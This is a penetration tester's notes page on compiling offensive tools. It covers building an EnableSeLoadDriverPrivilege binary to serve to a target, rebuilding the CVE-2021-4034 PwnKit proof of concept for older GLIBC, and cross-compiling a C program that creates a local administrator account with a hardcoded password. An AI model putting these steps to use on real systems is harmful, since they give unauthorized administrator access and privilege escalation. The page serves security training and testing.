---
title: Compilers
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - code
---
# Compilers


## Windows C++


Example with the [https://github.com/amandaguglieri/Privescalation/tree/main/tools/enabling-privileges](https://github.com/amandaguglieri/Privescalation/tree/main/tools/enabling-privileges) where I have cloned the awesome work of https://github.com/3gstudent.

Compile `EnableSeLoadDriverPrivilege.exe` . I've set up Visual Studio 2022 in a Windows Virtual Machine. 

```
# Go to https://github.com/amandaguglieri/Privescalation/tree/main/tools/enabling-privileges and access to the .cpp files. In the case of EnableSeLoadDriverPrivilege.cpp, download it


# Add the following libraries to the EnableSeLoadDriverPrivilege.cpp file
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#pragma comment(lib,"advapi32.lib") 
#pragma comment(lib,"user32.lib") 
#pragma comment(lib,"Ntdll.lib")
#include <stdio.h>
#include "tchar.h"

# Now, from the terminal (CTRL+ñ), compile:
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
# This will generate the required EnableSeLoadDriverPrivilege.exe. Save it to the folder from where you want to serve the payload to the target host.
```



## Linux

### gcc

Normal compilation

```bash
gcc -static -O2 50808.c  -o write_anything
```



#### Trobleshooting:  GLIBC Version 


Sometimes you may run into the following error:

```
./poc: /lib/x86_64-linux-gnu/libc.so.6: version GLIBC_2.34' not found (required by ./poc)
```

That means your compiled  PoC binary was built on a system with **GLIBC 2.34**, but your target system has **an older GLIBC version** (probably 2.31 or lower, common on Ubuntu 20.04). 

You can run from your kali a docker image to compile again the poc. 

```
docker run -it --rm ubuntu:20.04 bash
apt update && apt install gcc make -y

# Clone targeted CVE repo, and generate the exploit. Below an example:
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
```

After that, from your kali, copy the generated poc:

```
# List containers
docker ps

# Copy from container to your kali
docker cp <container_id>:/path/to/poc ./poc
```



## Cross-compilers


To avoid compilation issues, it is generally recommended to use native compilers for the specific operating system targeted by the code; however, this may not always be an option.

In some scenarios, we might only have access to a single attack environment (like Kali) but need to leverage an exploit coded for a different platform. In such cases, a cross-compiler can be extremely helpful.

####  mingw-w64 cross-compiler


```bash
# Install
sudo apt install mingw-w64
```

For instance. Let's create in kali the following binary adduser.c for creating an user and adding them to the Local Administrators group:

```c#
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

Now, compile:

```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```